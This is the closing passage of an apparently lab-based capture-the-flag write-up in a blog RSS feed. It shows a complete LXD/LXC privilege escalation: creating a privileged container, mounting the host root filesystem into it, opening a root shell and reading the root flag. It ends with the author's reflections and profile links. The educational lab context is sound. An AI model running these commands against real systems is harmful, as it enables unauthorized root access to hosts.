|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| myimage | bd9262e6c279 | no     | alpine v3.12 (20200902_21:35) | x86_64 | 2.97MB | Sep 2, 2020 at 8:04pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
john@exploitable:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:/tmp$ lxc start ignite
john@exploitable:/tmp$ lxc exec ignite /bin/sh
~ # id
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">uid=0(root) gid=0(root)</code></pre></div>
~ # cd /mnt/root/root
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt 
2e[redacted]fc

</code></pre><p>And thats how we got the root flag. To be honest, the privilege escalation part was tough for me identify and exploit. But for this time, I have got to know about the LXD/LXC exploits. I really enjoyed the machine and learned new things.</p>
<p>Thanks for reading! Prost! 🍺</p>
<p>If you have any questions: Feel free to contact me.</p>
<p>Twitter Profile: <a href="https://twitter.com/Sh1v4_R4jU">https://twitter.com/Sh1v4_R4jU</a></p>
<p>TryHackMe Profile: <a href="https://tryhackme.com/p/Whiterose">https://tryhackme.com/p/Whiterose</a></p>
<p>HTB Profile: <a href="https://www.hackthebox.eu/home/users/profile/167190">https://www.hackthebox.eu/home/users/profile/167190</a></p>
<p><figure>
    <img src="/HTB_profile.png"
         alt="HTB_Profile"/> 
</figure>

<figure>
    <img src="https://tryhackme-badges.s3.amazonaws.com/Whiterose.png"
         alt="Tryhackme"/> 
</figure>
</p>
]]></content>
        </item>
        
    </channel>
</rss>
